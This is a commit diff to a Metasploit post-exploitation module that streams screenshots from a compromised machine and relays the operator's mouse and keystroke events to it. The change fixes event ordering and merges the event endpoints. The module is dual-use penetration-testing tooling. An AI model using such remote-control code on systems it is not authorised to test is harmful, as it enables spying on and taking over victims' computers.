17174beecbb55e710931af63f4fd448a567e7512
Tim W <timrlw@gmail.com>
2019-06-20 21:23:46 +0800

    fix event sequencing

--- modules/post/multi/manage/screenshare.rb
+++ modules/post/multi/manage/screenshare.rb
@@ -19,43 +19,68 @@ class MetasploitModule < Msf::Post
     ))
   end
 
+  def run
+    @last_sequence = 0
+    @key_sequence = {}
+    exploit
+  end
+
+  def perform_event(query)
+    action = query['action'].first
+    if action == "key"
+      key = query['key'].first.to_i
+      keyaction = query['keyaction'].first.to_i
+      session.ui.keyevent_send(key, keyaction) if key
+    else
+      x = query['x'].first
+      y = query['y'].first
+      session.ui.mouse(action, x, y)
+    end
+  end
+
   def on_request_uri(cli, request)
     if request.uri =~ %r{/screenshot$*}
       quality = 50
       data = session.ui.screenshot(quality)
       send_response(cli, data, {'Content-Type'=>'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
-    elsif request.uri =~ %r{/mouse$*}
+    elsif request.uri =~ %r{/event$*}
       query = CGI.parse(request.body)
-      action = query['action'].first
-      x = query['x'].first
-      y = query['y'].first
-      session.ui.mouse(action, x, y)
-      send_response(cli, '')
-    elsif request.uri =~ %r{/keyup$*}
-      keycode = request.body.to_i
-      session.ui.keyevent_send(keycode, 2) if keycode
-      send_response(cli, '')
-    elsif request.uri =~ %r{/keydown$*}
-      keycode = request.body.to_i
-      session.ui.keyevent_send(keycode, 1) if keycode
+      seq = query['i'].first.to_i
+      if seq <= @last_sequence + 1
+        perform_event(query)
+        @last_sequence = seq
+      else
+        @key_sequence[seq] = query
+      end
+      while true
+        event = @key_sequence[@last_sequence + 1]
+        break unless event
+        perform_event(event)
+        @last_sequence = @last_sequence + 1
+        @key_sequence.delete(@last_sequence)
+      end
+
       send_response(cli, '')
     else
       print_status("Sent screenshare html to #{cli.peerhost}")
+      uripath = get_resource
+      uripath += '/' unless uripath.end_with? '/'
       html = %^<html>
 <head>
 <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
 <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
 <title>Metasploit screenshare</title>
 </head>
-<body>
+<body onload="updateImage()">
 <noscript>
 <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
 </noscript>
-<img src="screenshot" onload="updateImage()" onerror="noImage()" id="streamer">
+<img onload="updateImage()" onerror="noImage()" id="streamer">
 <br><br>
 <a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
 </body>
 <script language="javascript">
+var i = 1;
 var img = document.getElementById("streamer");
 
 function noImage() {
@@ -63,32 +88,35 @@ function noImage() {
 }
 
 function updateImage() {
-  img.src = "screenshot#" + Date.now();
+  img.src = "#{uripath}screenshot#" + Date.now();
   img.style = "display:";
 }
 
 function mouseEvent(action, x, y) {
   let req = new XMLHttpRequest;
-  req.open("POST", "mouse", true);
+  req.open("POST", "#{uripath}event", true);
   req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-  req.send('action='+action+'&x='+x+'&y='+y);
+  req.send('action='+action+'&x='+x+'&y='+y+'&i='+i);
+  i++;
 }
 
 function keyEvent(action, key) {
   let req = new XMLHttpRequest;
-  req.open("POST", action, true);
-  req.send(key);
+  req.open("POST", "#{uripath}event", true);
+  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  req.send('action=key&keyaction='+action+'&key='+key+'&i='+i);
+  i++;
 }
 
 document.onkeydown = function(event) {
   let key = event.which || event.keyCode;
-  keyEvent("keydown", key);
+  keyEvent(1, key);
   event.preventDefault();
 }
 
 document.onkeyup = function(event) {
   let key = event.which || event.keyCode;
-  keyEvent("keyup", key);
+  keyEvent(2, key);
   event.preventDefault();
 }
 
@@ -105,15 +133,10 @@ img.ondblclick = function(event) {
   mouseEvent('doubleclick', event.pageX - img.offsetLeft, event.pageY - img.offsetTop);
   event.preventDefault();
 }
-
 </script>
 </html>
     ^
       send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
     end
-  end
-
-  def run
-    exploit
   end
 end
